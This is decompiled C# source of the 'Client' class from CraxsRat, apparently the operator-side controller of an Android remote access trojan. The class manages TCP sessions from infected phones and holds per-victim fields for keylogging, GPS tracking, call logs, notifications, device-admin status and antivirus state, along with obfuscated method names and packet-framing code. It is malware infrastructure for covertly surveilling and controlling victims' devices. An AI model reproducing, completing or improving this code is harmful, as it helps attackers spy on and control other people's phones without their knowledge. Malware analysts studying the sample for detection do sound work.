using System;
using System.Data;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x020000CE RID: 206
public class Client
{
	// Token: 0x060008D1 RID: 2257 RVA: 0x000D005C File Offset: 0x000CE25C
	public void CraxsRatkfvuiorkenfjhvkjhjklCraxsRatsmkasytw(TcpClient ParametersClient, int ParametersInteger, Accept sk)
	{
		try
		{
			this.MyServer = sk;
			this.myClient = ParametersClient;
			this.myClient.Client.ReceiveTimeout = -1;
			this.myClient.Client.SendTimeout = -1;
			this.myClient.Client.SendBufferSize = 5242880;
			this.myClient.Client.ReceiveBufferSize = 5242880;
			this.ClientRemoteAddress = ((IPEndPoint)ParametersClient.Client.RemoteEndPoint).ToString();
			this.ClientAddressIP = ((IPEndPoint)ParametersClient.Client.RemoteEndPoint).Address.ToString();
			this.ClientLocalAddress = this.ClientAddressIP + ":" + Conversions.ToString(ParametersInteger);
			this.isconnected = true;
			this.uptime = 60;
			this.isready = false;
			this.Wallpaper = null;
			this.Screen = "3";
			this.Wifi = null;
			this.WallpaperBackup = null;
			this.FirewallTable = new DataTable();
			this.TrackedAppsTable = new DataTable();
			this.Maxsize = -1L;
			this.Count = -1;
			this.Row = null;
			this.shot = true;
			this.qitGPS = false;
			this.qit = false;
			this.Keylogg = false;
			this.Keys = "0.0.0.0:0:null:null:null:null:0.0.0.0:0000:0";
			this.MemoryStream = new MemoryStream();
			this.buffer = new byte[1];
			this.SizeData = new object[]
			{
				-1,
				-1
			};
			this.mydatestart = DateTime.Now.AddSeconds(45.0);
			try
			{
				if (!this.MyServer.Blocklist.Contains(this.ClientAddressIP))
				{
					this.myClient.Client.BeginReceive(this.buffer, 0, this.buffer.Length, SocketFlags.None, new AsyncCallback(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsthaszxy), this.myClient.Client);
				}
			}
			catch (Exception ex)
			{
			}
			new Thread(new ThreadStart(this.updatedata))
			{
				IsBackground = true
			}.Start();
		}
		catch (Exception ex2)
		{
		}
	}

	// Token: 0x060008D2 RID: 2258 RVA: 0x000D02C8 File Offset: 0x000CE4C8
	private void updatedata()
	{
		for (;;)
		{
			try
			{
				do
				{
					Thread.Sleep(45000);
				}
				while (this.isconnected);
				this.Close(this.myClient);
				break;
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x060008D3 RID: 2259 RVA: 0x000D031C File Offset: 0x000CE51C
	public Client(TcpClient ParametersClient, int ParametersInteger, Accept sk)
	{
		this.ActiveNow = "";
		this.isconnected = false;
		this.needpong = false;
		this.IsonVPN = false;
		this.Country = "null";
		this.android = "null";
		this.ClientName = "null";
		this.UUID = "null";
		this.FolderUSER = "null";
		this.host = "null";
		this.Statistics = "null";
		this.BatteryCharge = "null";
		this.isnewcall = false;
		this.ID = 0;
		this.@lock = RuntimeHelpers.GetObjectValue(new object());
		this.EXI = false;
		this.power = false;
		this.isnewnotifi = false;
		this.CountPoing = 0;
		this.VersionClient = "n/a";
		this.isready = false;
		this.MaxPower = false;
		this.pooked = false;
		this.IsAdminActive = false;
		this.IsReal = false;
		this.mylock = RuntimeHelpers.GetObjectValue(new object());
		this.CraxsRatkfvuiorkenfjhvkjhjklCraxsRatsmkasytw(ParametersClient, ParametersInteger, sk);
	}

	// Token: 0x060008D4 RID: 2260 RVA: 0x000D0428 File Offset: 0x000CE628
	public void SendMessage(object[] ParametersObjects)
	{
		try
		{
			byte[] bByte = Codes.FormatPacket((string)ParametersObjects[1], (byte[])ParametersObjects[2]);
			this.Sender(bByte);
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x060008D5 RID: 2261 RVA: 0x000D0474 File Offset: 0x000CE674
	private void SendCallback(IAsyncResult ar)
	{
		try
		{
			TcpClient tcpClient = (TcpClient)ar.AsyncState;
			tcpClient.Client.EndSend(ar);
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x060008D6 RID: 2262 RVA: 0x000D04BC File Offset: 0x000CE6BC
	public void Sender(byte[] bByte)
	{
		new Thread(checked(delegate()
		{
			object obj = this.@lock;
			ObjectFlowControl.CheckForSyncLockOnValueType(obj);
			lock (obj)
			{
				Thread.Sleep(1);
				try
				{
					if (this.isconnected)
					{
						this.myClient.Client.Poll(-1, SelectMode.SelectWrite);
						this.myClient.Client.SendBufferSize = bByte.Length;
						this.myClient.Client.Send(bByte, 0, bByte.Length, SocketFlags.None);
						this.MyServer.BytesSent += unchecked((long)bByte.Length);
					}
				}
				catch (SocketException ex)
				{
					this.isconnected = false;
				}
				catch (ObjectDisposedException ex2)
				{
					this.isconnected = false;
				}
				catch (Exception ex3)
				{
					this.isconnected = false;
				}
			}
		}))
		{
			IsBackground = true
		}.Start();
	}

	// Token: 0x060008D7 RID: 2263 RVA: 0x000D04FC File Offset: 0x000CE6FC
	public void Blockme(string ip)
	{
		if (!this.MyServer.Blocklist.Contains(ip))
		{
			this.MyServer.Blocklist.Add(ip);
			Data.MainForm.DGVblocked.Rows.Add(new object[]
			{
				this.Flag,
				ip
			});
		}
	}

	// Token: 0x060008D8 RID: 2264 RVA: 0x000D0558 File Offset: 0x000CE758
	public void CraxsRatkfvuiorkenfudpajrsnCraxsRatsthaszxy(IAsyncResult ar)
	{
		int num;
		try
		{
			num = this.myClient.Client.EndReceive(ar);
		}
		catch (SocketException ex)
		{
			num = -1;
		}
		catch (Exception ex2)
		{
			num = -1;
		}
		checked
		{
			if (num > 0)
			{
				try
				{
					this.MyServer.BytesReceived += unchecked((long)num);
					if (this.Maxsize == -1L)
					{
						if (this.buffer[0] == 0)
						{
							this.MemoryStream.WriteByte(this.buffer[0]);
							this.Count++;
							if (this.Count == 1)
							{
								string text = Codes.Encoding().GetString(this.MemoryStream.ToArray()).Trim();
								string[] array = text.Split(new char[1], StringSplitOptions.None);
								long num2 = Versioned.IsNumeric(array[0].Trim()) ? Conversions.ToLong(array[0].Trim()) : 0L;
								long num3 = Versioned.IsNumeric(array[1].Trim()) ? Conversions.ToLong(array[1].Trim()) : 0L;
								this.SizeData = new object[]
								{
									num2,
									num3
								};
								this.Maxsize = num2 + num3;
								long maxsize = this.Maxsize;
								this.myClient.Client.ReceiveBufferSize = (int)maxsize;
								this.Count = -1;
								this.buffer = new byte[(int)(this.Maxsize - 1L) + 1 - 1 + 1];
								this.MemoryStream.Dispose();
								this.MemoryStream = new MemoryStream();
							}
						}
						else
						{
							this.MemoryStream.WriteByte(this.buffer[0]);
						}
					}
					else
					{
						this.MemoryStream.Write(this.buffer, 0, num);
						if (unchecked((long)this.MemoryStream.ToArray().Length) == this.Maxsize)
						{
							ListData listData = new ListData(this, this.MemoryStream.ToArray(), this.SizeData, this.myClient);
							object objectValue = RuntimeHelpers.GetObjectValue(this.MyServer.SyncObj);
							object obj = objectValue;
							ObjectFlowControl.CheckForSyncLockOnValueType(obj);
							lock (obj)
							{
								this.MyServer.RequestsReceiver.Add(listData);
							}
							do
							{
								Thread.Sleep(1);
								Application.DoEvents();
							}
							while (!listData.wait);
							this.MemoryStream.Dispose();
							this.MemoryStream = new MemoryStream();
							this.SizeData = new object[]
							{
								-1,
								-1
							};
							this.Maxsize = -1L;
							this.buffer = new byte[1];
						}
						else
						{
							this.buffer = new byte[(int)(this.Maxsize - this.MemoryStream.Length - 1L) + 1 - 1 + 1 - 1 + 1];
						}
					}
				}
				catch (Exception ex3)
				{
				}
				try
				{
					if (this.myClient.Client.Connected)
					{
						this.myClient.Client.BeginReceive(this.buffer, 0, this.buffer.Length, SocketFlags.None, new AsyncCallback(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsthaszxy), this.myClient.Client);
					}
					else
					{
						this.isconnected = false;
					}
					return;
				}
				catch (SocketException ex4)
				{
					this.isconnected = false;
					return;
				}
				catch (Exception ex5)
				{
					this.isconnected = false;
					return;
				}
			}
			this.isconnected = false;
		}
	}

	// Token: 0x060008D9 RID: 2265 RVA: 0x000D0994 File Offset: 0x000CEB94
	public void Close(TcpClient client)
	{
		try
		{
			if (!this.EXI)
			{
				this.EXI = true;
				this.qit = true;
				this.isconnected = false;
				new Thread(new ThreadStart(this.close_async))
				{
					IsBackground = true
				}.Start();
			}
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x060008DA RID: 2266 RVA: 0x000D0A00 File Offset: 0x000CEC00
	public void close_async()
	{
		try
		{
			if (this.FirewallTable.Rows.Count > 0)
			{
				Data.MainForm.Invoke(new VB_0024AnonymousDelegate_0(delegate()
				{
					this.FirewallTable.Rows.Clear();
					this.FirewallTable.Dispose();
				}));
			}
		}
		catch (Exception ex)
		{
		}
		try
		{
			if (this.TrackedAppsTable.Rows.Count > 0)
			{
				Data.MainForm.Invoke(new VB_0024AnonymousDelegate_0(delegate()
				{
					this.TrackedAppsTable.Rows.Clear();
					this.TrackedAppsTable.Dispose();
				}));
			}
		}
		catch (Exception ex2)
		{
		}
		if (this.MemoryStream != null)
		{
			try
			{
				this.MemoryStream.Dispose();
			}
			catch (Exception ex3)
			{
			}
		}
		if (this.myClient != null)
		{
			try
			{
				if (this.myClient.Client.Connected)
				{
					this.myClient.GetStream().Close();
				}
			}
			catch (Exception ex4)
			{
			}
			try
			{
				this.myClient.Client.Close();
			}
			catch (Exception ex5)
			{
			}
		}
		try
		{
			if (this.Row != null)
			{
				Data.MainForm.Invoke(new VB_0024AnonymousDelegate_0(delegate()
				{
					Data.LOGIT(this, "Disconnected", this.Flag);
					if (Operators.CompareString(MySettingsProperty.Settings.ShowAlertDis, "Yes", false) == 0)
					{
						EagleAlert.ShowCustome("Connection Lost", this.Wallpaper, Color.Black, Color.FromArgb(157, 5, 17));
					}
				}));
				Data.MainForm.RemoveCard(this.Row, this.UUID);
				this.Row = null;
			}
		}
		catch (Exception ex6)
		{
		}
		try
		{
			if (this.ClientRemoteAddress != null && Data.ClientsOnline.Contains(this.ClientRemoteAddress))
			{
				Data.ClientsOnline.Remove(this.ClientRemoteAddress);
			}
		}
		catch (Exception ex7)
		{
		}
	}

	// Token: 0x060008DB RID: 2267 RVA: 0x000D0BFC File Offset: 0x000CEDFC
	public int Progresr()
	{
		int num = 0;
		int result;
		if (this.Maxsize == -1L)
		{
			result = num;
		}
		else
		{
			try
			{
				num = checked(this.RateConverter((int)this.MemoryStream.Length, (int)this.Maxsize));
				result = num;
			}
			catch (ObjectDisposedException ex)
			{
				result = 0;
			}
		}
		return result;
	}

	// Token: 0x060008DC RID: 2268 RVA: 0x000D0C68 File Offset: 0x000CEE68
	public int RateConverter(int Value, int Totalsize)
	{
		int result;
		try
		{
			result = ((Totalsize != 0) ? checked((int)Math.Round(unchecked((double)Value / (double)Totalsize * 100.0))) : 0);
		}
		catch (Exception ex)
		{
			result = 0;
		}
		return result;
	}

	// Token: 0x04000D3E RID: 3390
	public string Keys;

	// Token: 0x04000D3F RID: 3391
	public string ClientAddressIP;

	// Token: 0x04000D40 RID: 3392
	public string ClientRemoteAddress;

	// Token: 0x04000D41 RID: 3393
	public string ActiveNow;

	// Token: 0x04000D42 RID: 3394
	public string ClientLocalAddress;

	// Token: 0x04000D43 RID: 3395
	public byte[] buffer;

	// Token: 0x04000D44 RID: 3396
	public MemoryStream MemoryStream;

	// Token: 0x04000D45 RID: 3397
	public long Maxsize;

	// Token: 0x04000D46 RID: 3398
	public bool isconnected;

	// Token: 0x04000D47 RID: 3399
	public int Count;

	// Token: 0x04000D48 RID: 3400
	public Size ScreenSize;

	// Token: 0x04000D49 RID: 3401
	public object[] SizeData;

	// Token: 0x04000D4A RID: 3402
	public DataGridViewRow Row;

	// Token: 0x04000D4B RID: 3403
	public DataTable FirewallTable;

	// Token: 0x04000D4C RID: 3404
	public DataTable TrackedAppsTable;

	// Token: 0x04000D4D RID: 3405
	public string[] TrackedDatesFounded;

	// Token: 0x04000D4E RID: 3406
	public bool needpong;

	// Token: 0x04000D4F RID: 3407
	public bool IsonVPN;

	// Token: 0x04000D50 RID: 3408
	public bool qit;

	// Token: 0x04000D51 RID: 3409
	public bool qitGPS;

	// Token: 0x04000D52 RID: 3410
	public bool shot;

	// Token: 0x04000D53 RID: 3411
	public bool Keylogg;

	// Token: 0x04000D54 RID: 3412
	public Bitmap Flag;

	// Token: 0x04000D55 RID: 3413
	public string Screen;

	// Token: 0x04000D56 RID: 3414
	public string Battery;

	// Token: 0x04000D57 RID: 3415
	public string Country;

	// Token: 0x04000D58 RID: 3416
	public string android;

	// Token: 0x04000D59 RID: 3417
	public string ClientName;

	// Token: 0x04000D5A RID: 3418
	public string UUID;

	// Token: 0x04000D5B RID: 3419
	public string FolderUSER;

	// Token: 0x04000D5C RID: 3420
	public string host;

	// Token: 0x04000D5D RID: 3421
	public string Statistics;

	// Token: 0x04000D5E RID: 3422
	public string BatteryCharge;

	// Token: 0x04000D5F RID: 3423
	public string[] CALLS;

	// Token: 0x04000D60 RID: 3424
	public bool isnewcall;

	// Token: 0x04000D61 RID: 3425
	public int ID;

	// Token: 0x04000D62 RID: 3426
	private readonly object @lock;

	// Token: 0x04000D63 RID: 3427
	public bool EXI;

	// Token: 0x04000D64 RID: 3428
	public Bitmap Wallpaper;

	// Token: 0x04000D65 RID: 3429
	public Bitmap WallpaperBackup;

	// Token: 0x04000D66 RID: 3430
	public bool power;

	// Token: 0x04000D67 RID: 3431
	public bool isnewnotifi;

	// Token: 0x04000D68 RID: 3432
	public int CountPoing;

	// Token: 0x04000D69 RID: 3433
	public string VersionClient;

	// Token: 0x04000D6A RID: 3434
	public Accept MyServer;

	// Token: 0x04000D6B RID: 3435
	public TcpClient myClient;

	// Token: 0x04000D6C RID: 3436
	public int uptime;

	// Token: 0x04000D6D RID: 3437
	public string ClientDefender;

	// Token: 0x04000D6E RID: 3438
	public string installdate;

	// Token: 0x04000D6F RID: 3439
	public string Phone_model;

	// Token: 0x04000D70 RID: 3440
	public string[] Notifications;

	// Token: 0x04000D71 RID: 3441
	public bool isready;

	// Token: 0x04000D72 RID: 3442
	public bool MaxPower;

	// Token: 0x04000D73 RID: 3443
	public bool pooked;

	// Token: 0x04000D74 RID: 3444
	public bool IsAdminActive;

	// Token: 0x04000D75 RID: 3445
	public bool IsReal;

	// Token: 0x04000D76 RID: 3446
	public bool Isv4;

	// Token: 0x04000D77 RID: 3447
	public Bitmap Wifi;

	// Token: 0x04000D78 RID: 3448
	public DateTime mydatestart;

	// Token: 0x04000D79 RID: 3449
	private readonly object mylock;
}
